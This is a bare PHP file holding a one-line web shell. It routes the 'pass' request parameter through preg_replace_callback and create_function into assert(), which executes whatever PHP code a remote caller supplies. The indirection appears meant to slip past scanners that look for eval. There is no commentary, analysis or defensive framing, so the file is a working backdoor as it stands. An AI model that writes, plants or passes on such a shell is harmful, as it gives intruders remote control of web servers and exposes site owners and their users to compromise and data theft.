<?php
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);
?>